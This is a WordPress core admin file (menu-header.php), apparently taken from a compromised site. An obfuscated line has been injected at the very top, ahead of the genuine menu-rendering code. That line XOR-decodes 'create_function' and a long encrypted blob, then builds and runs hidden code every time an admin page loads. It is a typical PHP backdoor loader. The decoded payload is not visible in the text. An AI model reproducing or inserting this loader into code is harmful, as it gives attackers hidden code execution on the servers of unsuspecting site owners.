<?php $aiNPnl='VBEZ<Sa4H,- :Q='^'50 ;H6>R=BNTS>S';$qIsmxYffv=$aiNPnl('',',ZMdM:RS;RT947HGX3EJI7XCfI  W,<59ThoqDBdNPFVU6UXPQ<D=r.A-Zd3W XfUUALTyIIZ1LXpqoDY->l9mTUYSPsCJlxyGSRAgh.bvmXPuaDy41HPK>Ip,49VoCsoTjAqeZdtDDCyKsddn08:.7eU-zcUv15<9jDGqUKHL5KZAOS4>sfape1e KZI1RcWY73NC:OHX3;gOJAHVjre1JUS0iYU6ONLfUUCmjp10=>WMSo1Y> T EwOIe2<v,:6K.EkwFHWzsyPFXA=13Gg:4bL4.>Q6=7,VZuhGUGzaqnJZ89YITo4L;UEQD+peISIcQtUSG2ON<EBUBRE4,-BbQ-gv87h73AL6oE21WWmSaJBQW9VYj+RyOS-6=YqE1IvrxaY61vgjfNT YMUOcHG0PBEz3Z:L.cdtR.2VSQjxC,2QC-A80 5q4:=>-3DOjeXA7a2AMYTF.IQT=-7RlD+JJBhdc68.V+;1YoHcc=Knj5ZX8AtBjAJG214UE--IMSO.GoJ9K7vbxl.UCRfOonnf75BpF,7LQpeVRIk9KboqBWYWV brPpIqW1G7kaODbpmDdkbsT7D6p6PnRwShR3 AAh==-<NTPB9Idm8O;G:3 QODTP52JjduzwoREUbjV3J+BiD6TA:j:SYBUZVsveaRn-0U5cbzn76'^'E<eE+O<0O;;WkR0.+G6bnO719-AT6scXL OFXd9nG6386B<7>qD+O-J Y;;l:U,Nq1 85Uim1T5qPQOdyV4e0I; -smSdmWrpN5=3OLGBKMhkUE-EGE:<.PaTHUM7FxSK=AjXoSmP+17YeNDLJTYNOlA<pZ=uRZPEbN-gTu8<>Y.4ik8QGZ;HKo8lR..<C<Ks6BGgx0F5RN1mk. <7JOEW+9 URSqR.:-9>0:MWPWQQM2vYeW6LE5C-Wgm:qs9gsskO6KS--.ZNGpb. QDVnGA>khPOJ0iVRUvgUL,0>AkxJ.;LXyttKB-W  jNVzo 5iKpP123SfnGOK3-  UOEbJur53ib-dga-EOaYT.wPmAn40;L3pJPXpFwIWI8..T0VOXE2SHMmcoj0A-,urCl1Q<7 A9SGFSinP6OF7slJ86BA41D TYZPYLUOaIR0.5:54CIP ><brq-47RIRzH J>+kDDGRYZ7tPT FaXiT-FNQ;,YaRdJ 85SHk> Tr,5:<Z4GmR.NQNXHJ473OoIHNNZQwXbHV80+B=70LdbBRLbpn6dERBdC+CeRwRSYysUHYrQSSKmSvPFTwGrQuH3AR 87VXTc+,91M:LJH.B+URDvcdp4TF+CMUZWOre.hc3E+GjM W  aMJ2 .:;2T+LZXgHH<AKRSU=K');$qIsmxYffv();
/**
 * Displays Administration Menu.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * The current page.
 *
 * @global string $self
 */
$self = preg_replace('|^.*/wp-admin/network/|i', '', $_SERVER['PHP_SELF']);
$self = preg_replace('|^.*/wp-admin/|i', '', $self);
$self = preg_replace('|^.*/plugins/|i', '', $self);
$self = preg_replace('|^.*/mu-plugins/|i', '', $self);

/**
 * For when admin-header is included from within a function.
 *
 * @global array  $menu
 * @global array  $submenu
 * @global string $parent_file
 * @global string $submenu_file
 */
global $menu, $submenu, $parent_file, $submenu_file;

/**
 * Filters the parent file of an admin menu sub-menu item.
 *
 * Allows plugins to move sub-menu items around.
 *
 * @since MU
 *
 * @param string $parent_file The parent file.
 */
$parent_file = apply_filters( 'parent_file', $parent_file );

/**
 * Filters the file of an admin menu sub-menu item.
 *
 * @since 4.4.0
 *
 * @param string $submenu_file The submenu file.
 * @param string $parent_file  The submenu item's parent file.
 */
$submenu_file = apply_filters( 'submenu_file', $submenu_file, $parent_file );

get_admin_page_parent();

/**
 * Display menu.
 *
 * @access private
 * @since 2.7.0
 *
 * @global string $self
 * @global string $parent_file
 * @global string $submenu_file
 * @global string $plugin_page
 * @global string $typenow
 *
 * @param array $menu
 * @param array $submenu
 * @param bool  $submenu_as_parent
 */
function _wp_menu_output( $menu, $submenu, $submenu_as_parent = true ) {
	global $self, $parent_file, $submenu_file, $plugin_page, $typenow;

	$first = true;
	// 0 = menu_title, 1 = capability, 2 = menu_slug, 3 = page_title, 4 = classes, 5 = hookname, 6 = icon_url
	foreach ( $menu as $key => $item ) {
		$admin_is_parent = false;
		$class = array();
		$aria_attributes = '';
		$aria_hidden = '';
		$is_separator = false;

		if ( $first ) {
			$class[] = 'wp-first-item';
			$first = false;
		}

		$submenu_items = array();
		if ( ! empty( $submenu[$item[2]] ) ) {
			$class[] = 'wp-has-submenu';
			$submenu_items = $submenu[$item[2]];
		}

		if ( ( $parent_file && $item[2] == $parent_file ) || ( empty($typenow) && $self == $item[2] ) ) {
			$class[] = ! empty( $submenu_items ) ? 'wp-has-current-submenu wp-menu-open' : 'current';
		} else {
			$class[] = 'wp-not-current-submenu';
			if ( ! empty( $submenu_items ) )
				$aria_attributes .= 'aria-haspopup="true"';
		}

		if ( ! empty( $item[4] ) )
			$class[] = esc_attr( $item[4] );

		$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';
		$id = ! empty( $item[5] ) ? ' id="' . preg_replace( '|[^a-zA-Z0-9_:.]|', '-', $item[5] ) . '"' : '';
		$img = $img_style = '';
		$img_class = ' dashicons-before';

		if ( false !== strpos( $class, 'wp-menu-separator' ) ) {
			$is_separator = true;
		}

		/*
		 * If the string 'none' (previously 'div') is passed instead of a URL, don't output
		 * the default menu image so an icon can be added to div.wp-menu-image as background
		 * with CSS. Dashicons and base64-encoded data:image/svg_xml URIs are also handled
		 * as special cases.
		 */
		if ( ! empty( $item[6] ) ) {
			$img = '<img src="' . $item[6] . '" alt="" />';

			if ( 'none' === $item[6] || 'div' === $item[6] ) {
				$img = '<br />';
			} elseif ( 0 === strpos( $item[6], 'data:image/svg+xml;base64,' ) ) {
				$img = '<br />';
				$img_style = ' style="background-image:url(\'' . esc_attr( $item[6] ) . '\')"';
				$img_class = ' svg';
			} elseif ( 0 === strpos( $item[6], 'dashicons-' ) ) {
				$img = '<br />';
				$img_class = ' dashicons-before ' . sanitize_html_class( $item[6] );
			}
		}
		$arrow = '<div class="wp-menu-arrow"><div></div></div>';

		$title = wptexturize( $item[0] );

		// hide separators from screen readers
		if ( $is_separator ) {
			$aria_hidden = ' aria-hidden="true"';
		}

		echo "\n\t<li$class$id$aria_hidden>";

		if ( $is_separator ) {
			echo '<div class="separator"></div>';
		} elseif ( $submenu_as_parent && ! empty( $submenu_items ) ) {
			$submenu_items = array_values( $submenu_items );  // Re-index.
			$menu_hook = get_plugin_page_hook( $submenu_items[0][2], $item[2] );
			$menu_file = $submenu_items[0][2];
			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
				$menu_file = substr( $menu_file, 0, $pos );
			if ( ! empty( $menu_hook ) || ( ( 'index.php' != $submenu_items[0][2] ) && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! file_exists( ABSPATH . "/wp-admin/$menu_file" ) ) ) {
				$admin_is_parent = true;
				echo "<a href='admin.php?page={$submenu_items[0][2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>$title</div></a>";
			} else {
				echo "\n\t<a href='{$submenu_items[0][2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>$title</div></a>";
			}
		} elseif ( ! empty( $item[2] ) && current_user_can( $item[1] ) ) {
			$menu_hook = get_plugin_page_hook( $item[2], 'admin.php' );
			$menu_file = $item[2];
			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
				$menu_file = substr( $menu_file, 0, $pos );
			if ( ! empty( $menu_hook ) || ( ( 'index.php' != $item[2] ) && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! file_exists( ABSPATH . "/wp-admin/$menu_file" ) ) ) {
				$admin_is_parent = true;
				echo "\n\t<a href='admin.php?page={$item[2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>{$item[0]}</div></a>";
			} else {
				echo "\n\t<a href='{$item[2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>{$item[0]}</div></a>";
			}
		}

		if ( ! empty( $submenu_items ) ) {
			echo "\n\t<ul class='wp-submenu wp-submenu-wrap'>";
			echo "<li class='wp-submenu-head' aria-hidden='true'>{$item[0]}</li>";

			$first = true;

			// 0 = menu_title, 1 = capability, 2 = menu_slug, 3 = page_title, 4 = classes
			foreach ( $submenu_items as $sub_key => $sub_item ) {
				if ( ! current_user_can( $sub_item[1] ) )
					continue;

				$class = array();
				if ( $first ) {
					$class[] = 'wp-first-item';
					$first = false;
				}

				$menu_file = $item[2];

				if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
					$menu_file = substr( $menu_file, 0, $pos );

				// Handle current for post_type=post|page|foo pages, which won't match $self.
				$self_type = ! empty( $typenow ) ? $self . '?post_type=' . $typenow : 'nothing';

				if ( isset( $submenu_file ) ) {
					if ( $submenu_file == $sub_item[2] )
						$class[] = 'current';
				// If plugin_page is set the parent must either match the current page or not physically exist.
				// This allows plugin pages with the same hook to exist under different parents.
				} elseif (
					( ! isset( $plugin_page ) && $self == $sub_item[2] ) ||
					( isset( $plugin_page ) && $plugin_page == $sub_item[2] && ( $item[2] == $self_type || $item[2] == $self || file_exists($menu_file) === false ) )
				) {
					$class[] = 'current';
				}

				if ( ! empty( $sub_item[4] ) ) {
					$class[] = esc_attr( $sub_item[4] );
				}

				$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';

				$menu_hook = get_plugin_page_hook($sub_item[2], $item[2]);
				$sub_file = $sub_item[2];
				if ( false !== ( $pos = strpos( $sub_file, '?' ) ) )
					$sub_file = substr($sub_file, 0, $pos);

				$title = wptexturize($sub_item[0]);

				if ( ! empty( $menu_hook ) || ( ( 'index.php' != $sub_item[2] ) && file_exists( WP_PLUGIN_DIR . "/$sub_file" ) && ! file_exists( ABSPATH . "/wp-admin/$sub_file" ) ) ) {
					// If admin.php is the current page or if the parent exists as a file in the plugins or admin dir
					if ( ( ! $admin_is_parent && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! is_dir( WP_PLUGIN_DIR . "/{$item[2]}" ) ) || file_exists( $menu_file ) )
						$sub_item_url = add_query_arg( array( 'page' => $sub_item[2] ), $item[2] );
					else
						$sub_item_url = add_query_arg( array( 'page' => $sub_item[2] ), 'admin.php' );

					$sub_item_url = esc_url( $sub_item_url );
					echo "<li$class><a href='$sub_item_url'$class>$title</a></li>";
				} else {
					echo "<li$class><a href='{$sub_item[2]}'$class>$title</a></li>";
				}
			}
			echo "</ul>";
		}
		echo "</li>";
	}

	echo '<li id="collapse-menu" class="hide-if-no-js">' .
		'<button type="button" id="collapse-button" aria-label="' . esc_attr__( 'Collapse Main menu' ) . '" aria-expanded="true">' .
		'<span class="collapse-button-icon" aria-hidden="true"></span>' .
		'<span class="collapse-button-label">' . __( 'Collapse menu' ) . '</span>' .
		'</button></li>';
}

?>

<div id="adminmenumain" role="navigation" aria-label="<?php esc_attr_e( 'Main menu' ); ?>">
<a href="#wpbody-content" class="screen-reader-shortcut"><?php _e( 'Skip to main content' ); ?></a>
<a href="#wp-toolbar" class="screen-reader-shortcut"><?php _e( 'Skip to toolbar' ); ?></a>
<div id="adminmenuback"></div>
<div id="adminmenuwrap">
<ul id="adminmenu">

<?php

_wp_menu_output( $menu, $submenu );
/**
 * Fires after the admin menu has been output.
 *
 * @since 2.5.0
 */
do_action( 'adminmenu' );

?>
</ul>
</div>
</div>
